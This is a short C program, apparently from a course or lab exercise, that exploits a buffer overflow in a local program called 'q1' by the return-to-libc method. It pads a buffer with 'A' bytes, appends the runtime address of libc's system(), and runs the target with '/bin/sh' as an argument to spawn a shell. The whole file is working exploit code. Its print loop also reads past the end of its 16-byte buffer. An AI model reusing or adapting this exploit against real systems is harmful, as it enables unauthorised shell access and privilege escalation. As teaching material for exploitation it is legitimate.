#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

int main(int argc, char **argv) {
   char *args[4];
   int i;

   unsigned char *overflow = malloc(16);

   void *handle = dlopen("/lib/libc.so.6", RTLD_LOCAL | RTLD_LAZY);
   int FUNC_ADDR = (int)dlsym(handle, "system");//0x4d2a5e60;

   memset(overflow, 0x41, 12);
   memcpy(overflow+12, &FUNC_ADDR, 4);
   
   printf("found system() address: 0x%X\n", FUNC_ADDR);
   printf("bof: ");
   for(i = 0; i < 17; i++) {
       printf("%X", overflow[i]);
   }
   printf("\n");

   args[0] = "./q1";
   args[1] = overflow;
   args[2] = "/bin/sh";
   args[3] = NULL;
   execv("./q1", args);
   
   dlclose(handle);
   free(overflow);

   return 0;
}
